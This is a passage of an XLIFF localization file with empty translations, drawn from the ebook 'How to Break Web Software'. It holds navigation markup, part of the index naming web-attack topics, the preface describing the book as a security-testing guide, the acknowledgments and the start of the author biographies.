        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=V.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=X.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=W.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.img.alt">
          <source>Next not available</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html" style="font-weight:bold;"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch10lev1sec3.html#iddle1699"&gt; XML&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1700"&gt; buffer overflow attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1701"&gt; data validation&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1702"&gt; external entity attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1703"&gt; recursive payload attacks&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1704"&gt; XOR&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch10lev1sec4.html#iddle1705"&gt; XPATHinjection attacks&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1706"&gt; xp_cmdshell&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1707"&gt; xp_dirtree&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1708"&gt; xp_fileexist&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1709"&gt; xp_fixeddrives&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1710"&gt; xp_grantlogin&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1711"&gt; xp_loginconfig&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1712"&gt; xp_logininfo&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1713"&gt; xp_makewebtask&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1714"&gt; xp_regaddmultistring&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1715"&gt; xp_regdeletekey&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1716"&gt; xp_regdeletevalue&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1717"&gt; xp_regread&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1718"&gt; xp_regremovemultistring&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1719"&gt; xp_regterminate_process&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1720"&gt; xp_regwrite&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1721"&gt; xp_runwebtask&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1722"&gt; xp_sendmail&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1723"&gt; xp_subdirs&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch05lev1sec2.html#iddle1724"&gt; XSS (cross-site scripting)&lt;/a&gt;&lt;a class="v2" href="ch06lev1sec2.html#iddle1725"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1726"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &lt;a class="v2" href="ch05lev1sec2.html#iddle1727"&gt; conducting this attack&lt;/a&gt;&lt;a class="v2" href="ch05lev1sec2.html#iddle1728"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1729"&gt; guestbook.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1730"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1731"&gt; reflected XSS&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1732"&gt; stored XSS&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=W.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.img.alt">
          <source>Next not available</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec11.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec11.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="portals" datatype="unknown">
        <group id="bvdep" datatype="unknown">
          <group id="images" datatype="unknown">
          </group>
          <group id="xsltemplates" datatype="unknown">
          </group>
        </group>
        <group id="proquestcombo" datatype="unknown">
          <group id="images" datatype="unknown">
          </group>
        </group>
      </group>
      <group id="pref01.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Preface</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="copyrightpg.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Preface</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Numerous times we've been asked when the next book in the &lt;span class="docEmphasis"&gt;How to Break...&lt;/span&gt; series will come out and what it's going to be about. The overwhelming request from our readers has been on the subject of Web applications. It seems many testers find they are working in this area and are facing the prospect of testing applications that employ applications' specialized protocols and languages that exist on the World Wide Web.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Although many of the tests from &lt;span class="docEmphasis"&gt;How to Break Software&lt;/span&gt; (Addison-Wesley, 2002) and &lt;span class="docEmphasis"&gt;How to Break Software Security&lt;/span&gt; (Addison-Wesley, 2003) are relevant in this environment, applications hosted on the Internet do suffer from some unique problems. This book tackles those problems in the same spirit of its predecessors with a decided slant toward security issues in Web applications.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Before we go into what this book is all about, first let us tell you what it &lt;span class="docEmphasis"&gt;isn't&lt;/span&gt; all about. We are not trying to rewrite the &lt;span class="docEmphasis"&gt;Hacking Exposed&lt;/span&gt; books. Although there is an overlap of subject matter with the hacking literature, our intention is not to show how to exploit a Web server or Web application. Our focus is about how to test Web applications for common failures that can lead to such exploitation.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;span class="docEmphasis"&gt;How to Break Web Software&lt;/span&gt; is a book written for software developers, testers, managers, and quality assurance professionals to help put the hackers out of business.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This focus necessarily means knowledge of hacker techniques is included in this book. After all, one needs to understand the techniques of their adversary in order to counter them. But, this book is about testing, not about exploitation. Our focus is to guide testers toward areas of the application that are prone to problems and methods of rooting them out.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This book isn't about creating a correct Web application architecture, nor is it about coding Web applications. There are other published opinions on this and each Web development platform has its own unique challenges that must be considered, which books like &lt;span class="docEmphasis"&gt;Innocent Code&lt;/span&gt; do so well. &lt;span class="docEmphasis"&gt;How to Break Web Software&lt;/span&gt;, however, does contain a lot of information about how &lt;span class="docEmphasis"&gt;not&lt;/span&gt; to architect and code a Web application. Thus, Web developers would be wise to consider it as part of their reference library on secure Web programming.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>What this book &lt;span class="docEmphasis"&gt;is&lt;/span&gt; about is pointing the tester toward specific attacks to try on their application to test its defenses. We will be looking at classic examples of malicious input, ways of bypassing validation and authorization checks, as well as problems inherited from certain configurations/languages/architectures&amp;mdash;all in a simple format that will show where to look for the problem, how to test for the problem, and advice on methods of mitigation. &lt;span class="docEmphasis"&gt;How to Break Web Software&lt;/span&gt; is intended as a one-stop shop for people to dip into to get information (and inspiration) to test Web-based applications for common problems.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Happy Web testing!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Mike&amp;nbsp;Andrews,&amp;nbsp;Orange&amp;nbsp;County,&amp;nbsp;California&lt;br /&gt;James&amp;nbsp;A.&amp;nbsp;Whittaker,&amp;nbsp;Melbourne,&amp;nbsp;Florida</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="copyrightpg.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="pref02.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Acknowledgments</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="pref01.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Acknowledgments</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Mike Andrews&lt;/span&gt;: I would like to thank my colleagues at Foundstone Professional Services for the support and intellectual curiosity instilled within the culture. In particular, I would like to thank Kartik Trivedi for his help with the Web services chapter and Carric Dooley for providing the excellent tools appendix within this book. Further thanks have to go to Eric Heitzman, Rudolph Araujo, and Shanit Gupta for batting around ideas of what should (and should not) be part of a Web testing methodology. I would also like to thank Toby Mikle, (&lt;a class="docLink" target="_blank" href="http://TMCreations.com"&gt;TMCreations.com&lt;/a&gt;) for the spider cartoon and fly icons appearing throughout the book. Finally, Scott Chase, Matt Oertle, and Hugh Thompson deserve a mention for planting the seeds and being an inspiration while I was at Florida Tech&amp;mdash;I wish you guys continued success.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;span class="docEmphStrong"&gt;James A. Whittaker&lt;/span&gt;: I would like to acknowledge my peers and counterparts at Security Innovation (SI) and Florida Tech for their countless hours of dedication to the discipline of breaking software. Special thanks go to Hugh Thompson, Florence Mottay, Scott Chase, and Jason Taylor of SI. You guys are virtuosos at this stuff and have found more Web defects than any other group I know. The Web is a safer place because of people like you.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="pref01.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="pref03.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>About the Authors</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="pref02.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>About the Authors</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Mike Andrews&lt;/span&gt; is a senior consultant at Foundstone who specializes in software security and leads the Web application security assessments and Ultimate Web Hacking classes. He brings with him a wealth of commercial and educational experience from both sides of the Atlantic and is a widely published author and speaker.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Before joining Foundstone, Mike was a freelance consultant and developer of Web-based information systems, working with clients such as &lt;span class="docEmphasis"&gt;The Economist&lt;/span&gt;, the London transport authority, and various United Kingdom universities. In 2002, after being an instructor and researcher for a number of years, Mike joined the Florida Institute of Technology as an assistant professor, where he was responsible for research projects and independent security reviews for the Office of Naval Research, Air Force Research Labs, and Microsoft Corporation.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Mike holds a Ph.D. in computer science from the University of Kent at Canterbury in the United Kingdom, where his focus was on debugging tools and programmer psychology.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;span class="docEmphStrong"&gt;James A. Whittaker&lt;/span&gt; is a professor of computer science at the Florida Institute of Technology (Florida Tech) and is founder of Security Innovation. In 1992, he earned his Ph.D. in computer science from the University of Tennessee. His research interests are software testing, software security, software vulnerability testing, and anticyber warfare technology.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
